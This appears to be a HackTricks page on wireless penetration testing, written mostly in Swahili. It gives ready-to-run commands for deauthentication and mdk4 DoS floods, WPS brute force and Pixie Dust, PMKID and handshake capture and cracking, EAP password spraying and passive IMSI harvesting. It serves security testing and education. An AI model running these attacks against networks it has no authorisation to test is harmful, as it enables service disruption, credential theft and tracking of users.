# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi amri za msingi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Zana

### Hijacker & NexMon (Android internal Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Endesha airgeddon na docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Kutoka: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Inaweza kufanya mashambulizi ya Evil Twin, KARMA, na Known Beacons, kisha kutumia phishing template ili kupata nenosiri halisi la mtandao au kunasa vielelezo vya mitandao ya kijamii.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Zana hii inaendesha kwa otomatiki mashambulizi ya **WPS/WEP/WPA-PSK**. Kwa otomatiki itafanya:

- Weka interface katika monitor mode
- Skana kwa networks zinazowezekana - Na ikuruhusu kuchagua victim(s)
- Ikiwa WEP - Anzisha WEP attacks
- Ikiwa WPA-PSK
- Ikiwa WPS: Pixie dust attack na brute-force attack (kuwa mwangalifu, brute-force attack inaweza kuchukua muda mrefu). Kumbuka kwamba haijajaribu null PIN au database/generated PINs.
- Jaribu kunasa PMKID kutoka AP ili ku-crack
- Jaribu deauthenticate clients wa AP ili kunasa handshake
- Ikiwa PMKID au Handshake, jaribu bruteforce ukitumia top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Kutenganisha wote (au ESSID/Client maalum)
- Random fake APs -- Kuficha nets, inawezekana kusababisha crash kwa scanners
- Overload AP -- Jaribu kuua AP (kawaida si muhimu sana)
- WIDS -- Chezea IDS
- TKIP, EAPOL -- Baadhi ya mashambulizi maalum ya DoS dhidi ya AP fulani
- **Cracking**
- Crack **WEP** (vyombo na mbinu kadhaa)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Inafaa kwa kunasa captive portal creds na/au kufanya LAN attacks
- **WPA-PSK** Evil Twin -- Inafaa kwa network attacks ikiwa unajua password
- **WPA-MGT** -- Inafaa kunasa company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Inafaa kwa kunasa captive portal creds na/au kufanya LAN attacks
- **+ WPA** -- Inafaa kunasa WPA handshakes

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Shambulizi za Deauthentication, njia inayotumika sana katika Wi-Fi hacking, zinahusisha uundaji wa fremu za "management" ili kuwalazimisha vifaa kutengwa kutoka kwenye network. Hizi packets zisizosimbuliwa zinadanganya clients kuwa zinatoka kwenye network halali, na hivyo kuwawezesha attackers kukusanya WPA handshakes kwa madhumuni ya cracking au kuvuruga muunganisho wa network kwa muda mrefu. Tactiki hii, inayotia wasiwasi kwa urahisi wake, inatumiwa sana na ina athari kubwa kwa usalama wa network.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 means deauthentication
- 1 ni idadi ya deauths za kutumwa (unaweza kutuma nyingi ikiwa unataka); 0 inamaanisha zitatumwa kwa mfululizo
- -a 00:14:6C:7E:40:80 ni MAC address ya access point
- -c 00:0F:B5:34:30:30 ni MAC address ya client wa deauthenticate; ikiwa hii itaachwa basi broadcast deauthentication itatumwa (si kila mara hufanya kazi)
- ath0 ni interface name

### Disassociation Packets

**Disassociation packets**, sawa na deauthentication packets, ni aina ya management frame inayotumika katika mitandao ya Wi-Fi.

Pakiti hizi hufanya kuvunja muunganisho kati ya kifaa (kama laptop au smartphone) na access point (AP). Tofauti kuu kati ya disassociation na deauthentication iko katika matukio yao ya matumizi. Wakati AP inapotuma **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, au kuhamishwa, hivyo kuhitaji kutenganishwa kwa node zote zilizounganishwa.

**Shambulio hili linaweza kufanywa na mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Shambulio za ziada za DOS kwa mdk4**

**Tazama** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Inatuma beacon frames ili kuonyesha fake APs kwa clients. Hii inaweza wakati mwingine kusababisha crash ya network scanners na hata drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Kutuma authentication frames kwa Access Points (APs) zote zinazopatikana ndani ya upeo kunaweza kupelekea mzigo kupita kiasi kwa APs hizo, hasa wakati clients wengi wanahusika. Trafiki kali kama hiyo inaweza kusababisha kutokuwa imara kwa mfumo, ikasababisha baadhi ya APs kufreeze au hata kureset.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Kuchunguza Access Points (APs) huthibitisha kama SSID inaonyeshwa ipasavyo na kuthibitisha upeo wa AP. Mbinu hii, iliyochanganywa na **bruteforcing hidden SSIDs** kwa au bila wordlist, husaidia kubaini na kupata ufikiaji wa mitandao iliyofichwa.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Kutuma packets za nasibu au nakala kwa QoS queues tofauti kunaweza kusababisha Michael Countermeasures kwenye **TKIP APs**, zikisababisha kuzima AP kwa dakika moja. Njia hii ni mbinu yenye ufanisi ya mashambulizi ya **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Kuifurika AP kwa **EAPOL Start frames** kunaunda **vikao vya bandia**, kunyanyasa AP na kuzuia wateja halali. Vinginevyo, kuingiza **bandia EAPOL Logoff messages** kunawakatisha wateja kwa nguvu; mbinu zote mbili huvuruga huduma ya mtandao kwa ufanisi.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Shambulizi mbalimbali kwenye link management na routing katika mesh networks.

**ATTACK MODE w: WIDS Confusion**

Kuunganisha wateja kwa WDS nodes nyingi au fake rogue APs kunaweza kudanganya Intrusion Detection and Prevention Systems, kuleta mkanganyiko na uwezekano wa matumizi mabaya ya mfumo.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

packet fuzzer inayotoa vyanzo mbalimbali vya packet na seti kamili ya modifiers kwa ajili ya urekebishaji wa packet.

### **Airggedon**

_**Airgeddon**_ inatoa wengi wa mashambulizi yaliyopendekezwa katika maoni yaliyopita:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) inarahisisha mchakato wa kuunganisha vifaa kwenye router, ikiboresha kasi na urahisi wa setup kwa mitandao iliyofichwa kwa **WPA** au **WPA2** Personal. Haifanyi kazi kwa usalama wa WEP ambao unaweza kuvujwa kwa urahisi. WPS inatumia PIN ya tarakimu 8, inayothibitishwa kwa nusu mbili, jambo ambalo linaifanya iwe hatarini kwa mashambulizi ya brute-force kutokana na idadi yake ndogo ya mchanganyiko (uwezekano 11,000).

### WPS Bruteforce

Kuna zana kuu 2 za kufanya hatua hii: Reaver na Bully.

- **Reaver** imeundwa kuwa shambulio imara na la vitendo dhidi ya WPS, na imethibitishwa dhidi ya aina mbalimbali za access points na utekelezaji wa WPS.
- **Bully** ni **utekelezaji mpya** wa WPS brute force attack, umeandikwa kwa C. Una faida kadhaa juu ya msimbo wa reaver wa awali: utegemezi mdogo, utendaji ulioboreshwa wa memory na CPU, utunzaji sahihi wa endianness, na seti thabiti zaidi ya chaguzi.

Shambulio linatumia udhaifu wa **WPS PIN**, hasa kuonyesha tarakimu nne za kwanza na jukumu la tarakimu ya mwisho kama checksum, jambo linalorahisisha brute-force attack. Hata hivyo, kinga dhidi ya brute-force attacks, kama vile **blocking MAC addresses** za wadukuzi wenye hamu, zinahitaji **MAC address rotation** ili kuendelea na shambulio.

Baada ya kupata WPS PIN kwa zana kama Bully au Reaver, mshambuliaji anaweza kubaini WPA/WPA2 PSK, kuhakikisha **ufikiaji wa mtandao wa kudumu**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Mbinu hii iliyoboreshwa inalenga WPS PINs kwa kutumia udhaifu uliyojulikana:

1. **PINs zilizogunduliwa awali**: Tumia hifadhidata ya PINs zilizojulikana zinazohusishwa na wazalishaji maalum ambao wanajulikana kutumia WPS PINs sawa. Hifadhidata hii inahusisha octets tatu za kwanza za MAC-addresses na PINs zinazoweza kuwa za wazalishaji hao.
2. **PIN Generation Algorithms**: Tumia algorithimu kama ComputePIN na EasyBox, ambazo huhesabu WPS PINs kulingana na MAC-address ya AP. Arcadyan algorithm pia inahitaji device ID, ikiongezea tabaka kwenye mchakato wa kuzalisha PIN.

### WPS Pixie Dust attack

**Dominique Bongard** aligundua kasoro katika baadhi ya Access Points (APs) kuhusu utengenezaji wa secret codes, zinazoitwa **nonces** (**E-S1** and **E-S2**). Ikiwa nonces hizi zinaweza kubainishwa, kuvunja WPS PIN ya AP inakuwa rahisi. AP inafichua PIN ndani ya code maalum (hash) ili kuthibitisha kuwa ni halali na si rogue AP. Hizi nonces kwa kimsingi ni "funguo" za kufungua "salama" inayoshikilia WPS PIN. Zaidi kuhusu hili inapatikana [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Kwa maneno rahisi, tatizo ni kwamba baadhi ya APs hazikutumia funguo za kutosha za nasibu kwa kusimba PIN wakati wa mchakato wa kuunganishwa. Hii inafanya PIN kuwa nyeti kwa kukisiwa kutoka nje ya mtandao (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Ikiwa hautaki kubadili kifaa kuwa monitor mode, au `reaver` na `bully` zinapata tatizo, unaweza kujaribu [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Chombo hiki kinaweza kufanya Pixie Dust attack bila ya kuhitaji kubadilisha kuwa monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Baadhi ya mifumo iliyoundwa vibaya hata huruhusu **Null PIN** (PIN tupu au isiyoipo) kutoa ufikiaji, jambo ambalo ni la ajabu sana. Zana **Reaver** ina uwezo wa kujaribu udhaifu huu, tofauti na **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Shambulio zote za WPS zilizopendekezwa zinaweza kufanywa kwa urahisi kwa kutumia _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 na 6 hukuruhusu kujaribu **PIN yako ya kawaida** (ikiwa unayo)
- 7 na 8 hufanya **Pixie Dust attack**
- 13 inakuwezesha kujaribu **NULL PIN**
- 11 na 12 zitakusanya **PINs zinazohusiana na AP iliyochaguliwa kutoka kwenye hifadhidata zinazopatikana** na **kutengeneza** **PINs** zinazowezekana kwa kutumia: ComputePIN, EasyBox na kwa hiari Arcadyan (inayopendekezwa, kwanini si?)
- 9 na 10 zitatesta **PIN zote zinazowezekana**

## **WEP**

Imevunjika kabisa na haitumiki siku hizi. Fahamu tu kuwa _**airgeddon**_ ina chaguo la WEP linaloitwa "All-in-One" kushambulia aina hii ya ulinzi. Zana nyingine nyingi pia zina chaguzi zinazofanana.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Router nyingi za kisasa zinaongeza uwanja wa hiari kwenye **first EAPOL** frame wakati wa kuunganishwa, inayojulikana kama `Robust Security Network`. Hii inajumuisha `PMKID`.

Kama posti ya awali inavyoeleza, **PMKID** inaundwa kwa kutumia data zinazojulikana:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Kwa kuzingatia kwamba "PMK Name" ni thabiti, tunajua BSSID ya AP na station, na `PMK` ni sawa na ile kutoka kwa full 4-way handshake, **hashcat** inaweza kutumia taarifa hii kuvunja PSK na kurejesha passphrase!

Ili **kusanya** taarifa hizi na **bruteforce** nywila kienyeji unaweza kufanya:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** zitaonyeshwa kwenye **console** na pia **hifadhiwa** ndani ya \_ **/tmp/attack.pcap**\_\
Sasa, geuza capture kuwa muundo wa **hashcat/john** na crack hiyo:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tafadhali kumbuka kuwa muundo wa hash sahihi una **sehemu 4**, kama: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ikiwa yako **ina tu** **sehemu 3**, basi ni **batili** (PMKID capture haikuwa halali).

Kumbuka kwamba `hcxdumptool` **pia capture handshakes** (kitu kama hiki kitatokea: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Unaweza **geuza** **handshakes** kwa muundo wa **hashcat**/**john** ukitumia `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Nimegundua kuwa baadhi ya handshakes zilizokamatwa na zana hii hazikuweza ku-crack hata tukijua password sahihi. Ningependekeza kunasa handshakes pia kwa njia ya kawaida pale inapowezekana, au kunasa kadhaa kati yao ukitumia zana hii._

### Kunasa handshake

Shambulizi dhidi ya mitandao ya **WPA/WPA2** unaweza kufanywa kwa kunasa **handshake** na kujaribu **crack** password **offline**. Mchakato huu unahusisha kufuatilia mawasiliano ya mtandao maalum na **BSSID** kwenye **channel** fulani. Hapa kuna mwongozo uliorahisishwa:

1. Tambua **BSSID**, **channel**, na **connected client** wa mtandao lengwa.
2. Tumia `airodump-ng` kufuatilia trafiki ya mtandao kwenye channel na BSSID zilizotajwa, ukitarajia kunasa handshake. Amri itakuwa kama ifuatavyo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Ili kuongeza nafasi ya kukamata handshake, kata kwa muda mteja kutoka kwenye mtandao ili kulazimisha re-authentication. Hii inaweza kufanywa kwa kutumia amri ya `aireplay-ng`, ambayo inatuma deauthentication packets kwa mteja:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Mara tu `airodump-ng` inaonyesha taarifa za handshake, hiyo inamaanisha kuwa handshake imekamatwa na unaweza kuacha kusikiliza:

![](<../../images/image (172) (1).png>)

Mara handshake imekamatwa unaweza **crack** kwa `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Angalia ikiwa handshake iko katika faili

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Ikiwa zana hii inapata handshake isiyokamilika ya ESSID kabla ya ile iliyokamilika, haitagundua ile halali._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Katika **enterprise WiFi setups, utakutana na mbinu mbalimbali za uthibitishaji**, kila moja ikitoa viwango tofauti vya usalama na sifa za usimamizi. Unapotumia zana kama `airodump-ng` kuchunguza trafiki ya mtandao, unaweza kuona vitambulisho vya aina hizi za uthibitishaji. Baadhi ya mbinu za kawaida ni pamoja na:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Mbinu hii inaunga mkono hardware tokens na one-time passwords ndani ya EAP-PEAP. Tofauti na MSCHAPv2, haifanyi peer challenge na inatuma passwords katika plaintext kwa access point, ikitoa hatari ya downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Inahusisha kutuma MD5 hash ya password kutoka kwa client. Haipendekezwi kutokana na urejevu wa dictionary attacks, ukosefu wa server authentication, na kutoweza kuunda session-specific WEP keys.
3. **EAP-TLS (Transport Layer Security)**:
- Inatumia certificates za client-na-server kwa authentication na inaweza kuunda dynamic user-based na session-based WEP keys kwa ajili ya kuimarisha mawasiliano.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Inatoa mutual authentication kupitia encrypted tunnel, pamoja na mbinu ya kuanza dynamic, per-user, per-session WEP keys. Inahitaji tu server-side certificates, wakati clients wanatumia credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Inafanya kazi kama EAP kwa kuunda TLS tunnel kwa mawasiliano yaliyo salama. Inaruhusu utumiaji wa weaker authentication protocols juu ya EAP kutokana na ulinzi wa tunnel.
- **PEAP-MSCHAPv2**: Mara nyingi inatajwa kama PEAP, inachanganya vulnerable MSCHAPv2 challenge/response mechanism na protective TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Inafanana na EAP-TLS lakini inaanza TLS tunnel kabla ya kubadilishana certificates, ikitoa safu ya ziada ya usalama.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) inaonekana kwamba ikiwa unatumia **EAP** the **"Identity"** **messages** lazima ziwe **supported**, na the **username** itatumwa wazi katika **"Response Identity"** messages.

Hata ukitumia mojawapo ya authentication methods salama zaidi: **PEAP-EAP-TLS**, inawezekana **kushika username inayotumwa katika EAP protocol**. Ili kufanya hivyo, **capture a authentication communication** (anza `airodump-ng` ndani ya channel na `wireshark` katika interface ileile) na filter package kwa `eapol`.\
Ndani ya packet ya "**Response, Identity**", the **username** ya client itaonekana.

![](<../../images/image (850).png>)

### Anonymous Identities

Kuficha Identity kunaungwa mkono na EAP-PEAP na EAP-TTLS. Katika muktadha wa mtandao wa WiFi, EAP-Identity request kawaida inaanzishwa na access point (AP) wakati wa association process. Ili kuhakikisha ulinzi wa anonymity ya mtumiaji, response kutoka kwa EAP client kwenye kifaa cha mtumiaji ina taarifa muhimu tu zinazohitajika kwa server la mwanzo la RADIUS kushughulikia request. Dhana hii inaonyeshwa kupitia matukio yafuatayo:

- EAP-Identity = anonymous
- Katika senario hii, watumiaji wote wanatumia jina bandia "anonymous" kama kitambulisho cha mtumiaji. initial RADIUS server inafanya kazi kama EAP-PEAP au EAP-TTLS server, inayosimamia upande wa server wa PEAP au TTLS protocol. Mbinu ya inner (protected) authentication basi inashughulikiwa kwa ndani au kupelekwa kwa remote (home) RADIUS server.
- EAP-Identity = anonymous@realm_x
- Katika hali hii, watumiaji kutoka realms tofauti wanaficha vitambulisho vyao huku wakionyesha realms zao. Hii inaruhusu initial RADIUS server ku-proxy EAP-PEAP au EAP-TTLS requests kwa RADIUS servers za realms zao za nyumbani, ambazo zinatumika kama PEAP au TTLS server. initial RADIUS server inafanya kazi tu kama node ya RADIUS relay.
- Vinginevyo, initial RADIUS server inaweza kufanya kazi kama EAP-PEAP au EAP-TTLS server na kushughulikia mbinu ya protected authentication au kuisafirisha kwa server nyingine. Chaguo hili linawezesha konfigurishaji ya sera tofauti kwa realms mbalimbali.

Katika EAP-PEAP, mara tu TLS tunnel ikianzishwa kati ya PEAP server na PEAP client, PEAP server inaanzisha EAP-Identity request na kuituma kupitia TLS tunnel. Client inajibu EAP-Identity request ya pili kwa kutuma EAP-Identity response yenye identity halisi ya mtumiaji kupitia tunnel iliyosenywa. Njia hii kwa ufanisi inazuia ufunuliwa wa identity halisi ya mtumiaji kwa yeyote anayesikiliza trafiki ya 802.11.

EAP-TTLS inafuata taratibu kidogo tofauti. Kwa EAP-TTLS, client kawaida ina-authenticate kwa kutumia PAP au CHAP, zilizo secured na TLS tunnel. Katika kesi hii, client hujumuisha User-Name attribute na ama Password au CHAP-Password attribute katika initial TLS message inayotumwa baada ya tunnel kuanzishwa.

Bila kujali protocol iliyochaguliwa, PEAP/TTLS server hupata maarifa ya identity halisi ya mtumiaji baada ya TLS tunnel kuanzishwa. Identity halisi inaweza kuwakilishwa kama user@realm au kwa jina tu user. Ikiwa PEAP/TTLS server pia ndiye anayehusika na authenticating mtumiaji, sasa anamiliki identity ya mtumiaji na anaendelea na authentication method iliyolindwa na TLS tunnel. Vinginevyo, PEAP/TTLS server inaweza kusafirishia RADIUS request mpya kwa home RADIUS server ya mtumiaji. RADIUS request mpya hii haitumii layer ya PEAP au TTLS. Katika kesi ambapo mbinu ya protected authentication ni EAP, inner EAP messages zinatumwa kwa home RADIUS server bila EAP-PEAP au EAP-TTLS wrapper. The User-Name attribute ya outgoing RADIUS message inabeba identity halisi ya mtumiaji, ikibadilisha anonymous User-Name kutoka incoming RADIUS request. Wakati mbinu ya protected authentication ni PAP au CHAP (inayounga mkono tu na TTLS), User-Name na attributes nyingine za authentication zilizochukuliwa kutoka TLS payload zinachukuliwa katika outgoing RADIUS message, zikiondoa anonymous User-Name na TTLS EAP-Message attributes zilizopo katika incoming RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X inaweza leak permanent subscriber identifier (IMSI) kwa cleartext wakati wa unauthenticated identity phase ikiwa deployment haitumii pseudonyms/protected identities au TLS tunnel karibu na inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Maelezo:
- Inafanya kazi kabla ya tuneli yoyote ya TLS ikiwa usanidi unatumia EAP‑SIM/AKA bila kitambulisho kililindwa/majina bandia.
- Th exposed value ni kitambulisho cha kudumu kilichounganishwa na SIM ya mteja; kuvuna kunawawezesha kufuatilia kwa muda mrefu na matumizi mabaya ya telecom yatokanayo.

Madhara
- Faragha: ufuatiliaji wa kudumu wa mtumiaji/kifaa kutokana na kunaswa kwa Wi‑Fi kwa pasivu katika maeneo ya umma.
- Kuanzisha matumizi mabaya ya telecom: kwa IMSI, mdukuzi mwenye ufikiaji wa SS7/Diameter anaweza kuuliza eneo au kujaribu kukamata simu/SMS na kuiba MFA.

Mitigations / what to look for
- Th verify that clients use anonymous outer identities (majina bandia) for EAP‑SIM/AKA kama ilivyoelekezwa na 3GPP (mfano, 3GPP TS 33.402).
- Pendelea kuweka awamu ya kitambulisho ndani ya tuneli (mfano, EAP‑TTLS/PEAP ikibeba inner EAP‑SIM/AKA) ili IMSI haitumwi wazi.
- Ukunasaji wa pakiti za association/auth haupaswi kufichua IMSI ghafi katika EAP-Response/Identity.

Related: Matumizi mabaya ya signalling ya telecom kwa kitambulisho za simu zilizochukuliwa
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Ikiwa mteja anatarajiwa kutumia **username and password** (tazama kwamba **EAP-TLS won't be valid** katika kesi hii), basi unaweza kujaribu kupata **orodha** ya **usernames** (ona sehemu inayofuata) na **passwords** na kujaribu **bruteforce** upatikanaji kwa kutumia [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Unaweza pia kufanya attack hii kwa kutumia `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Nadharia za Mashambulizi ya Client

### Uteuzi wa Mtandao na Kupepeta

- Itifaki ya 802.11 inaelezea jinsi station inavyoungana na Extended Service Set (ESS) lakini haifafanui vigezo vya kuchagua ESS au access point (AP) ndani yake.
- Stations zinaweza kupepeta kati ya APs zinazoshiriki ESSID ileile, zikidumisha muunganisho ndani ya jengo au eneo.
- Itifaki inahitaji station kuthibitishwa kwa ESS lakini haisisitizi AP kuthibitishwa kwa station.

### Orodha za Mitandao Zilizopendekezwa (PNLs)

- Stations zinahifadhi ESSID ya kila mtandao wa wireless wanayounganishwa nao kwenye Preferred Network List (PNL), pamoja na maelezo ya usanidi maalumu wa mtandao.
- PNL inatumiwa kuungana kiotomatiki na mitandao inayojulikana, kuboresha uzoefu wa mtumiaji kwa kurahisisha mchakato wa kuungana.

### Passive Scanning

- APs hupeana kwa vipindi beacon frames, zikitangaza uwepo wao na sifa, ikiwemo ESSID ya AP isipokuwa ueneaji umezimwa.
- Wakati wa passive scanning, stations husikiliza kwa beacon frames. Ikiwa ESSID ya beacon inafanana na kipengee kwenye PNL ya station, station inaweza kuungana kiotomatiki na AP hiyo.
- Kujua PNL ya kifaa kunaruhusu uwezekano wa kutumiwa kwa kuiga ESSID ya mtandao unaojulikana, kudanganya kifaa kujiunga na rogue AP.

### Active Probing

- Active probing inahusisha stations kutuma probe requests ili kugundua APs za karibu na sifa zao.
